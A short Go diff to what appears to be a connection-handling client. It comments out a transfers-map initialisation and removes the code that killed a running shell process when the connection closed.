@@ -81,7 +81,7 @@ func start(config shared.BinaryConfig) {
 		}
 
 		Queue = make(chan OutgoingPacket)
-		Transfers = make(TransfersMap)
+		//Transfers = make(TransfersMap)
 
 		go func() {
 			for {
@@ -111,10 +111,7 @@ func start(config shared.BinaryConfig) {
 
 // Close is called when connection is lost
 func Close() {
-	// Kill any running shell
-	if current.process != nil {
-		current.process.Process.Kill()
-	}
+
 }
 
 func Uninstall() {
